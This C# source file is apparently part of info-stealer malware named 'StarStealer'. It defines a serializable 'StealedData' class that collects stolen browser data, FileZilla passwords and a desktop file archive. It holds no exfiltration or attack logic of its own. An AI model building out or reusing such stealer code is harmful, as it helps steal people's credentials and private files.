using System.Collections.Generic;
using System.Runtime.Serialization;

namespace StarStealer.Models
{
    [DataContract]
    class StealedData
    {
        [DataMember]
        public List<Browser> BrowsersData { get; set; }
        [DataMember]
        public List<PasswordData> FileZillaData { get; set; }
        [DataMember]
        public string DesktopArchive { get; set; }
        [DataMember]
        public int DesktopArchiveCount { get; set; }
    }
}
